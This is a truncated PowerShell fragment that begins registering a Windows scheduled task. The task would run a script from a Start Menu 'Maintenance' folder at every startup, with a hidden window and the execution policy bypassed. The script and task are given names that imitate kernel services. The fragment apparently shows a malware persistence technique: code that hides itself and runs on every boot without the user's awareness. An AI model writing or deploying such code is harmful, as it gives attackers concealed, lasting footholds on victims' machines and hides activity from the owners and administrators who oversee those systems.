        $serviceScriptPath = "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Maintenance\SysKernelExecutiveService.ps1"  
        $taskIdentifier = "KernelExecutiveWatchdogService"  
        if (-not (Get-ScheduledTask -TaskName $taskIdentifier -ErrorAction SilentlyContinue)) {  
            $act = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$serviceScriptPath`""  
            $trg = New-ScheduledTaskTrigger -AtStartup  
